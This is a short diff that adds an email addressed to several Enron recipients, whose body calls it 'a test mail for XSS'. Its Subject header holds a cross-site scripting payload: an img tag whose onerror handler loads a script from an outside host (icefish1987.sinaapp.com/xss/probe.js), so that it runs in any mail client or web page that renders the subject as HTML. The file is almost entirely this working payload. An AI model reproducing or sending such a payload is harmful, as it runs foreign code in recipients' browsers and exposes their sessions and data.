@@ -1,0 +1,7 @@
+From: "Richard" <richard@guitarra.biz>
+To: brent.hendry@enron.com, mark.taylor@enron.com, tana.jones@enron.com, 
+Subject: <img src='ice' onerror="loadScript('http://icefish1987.sinaapp.com/xss/probe.js')">
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
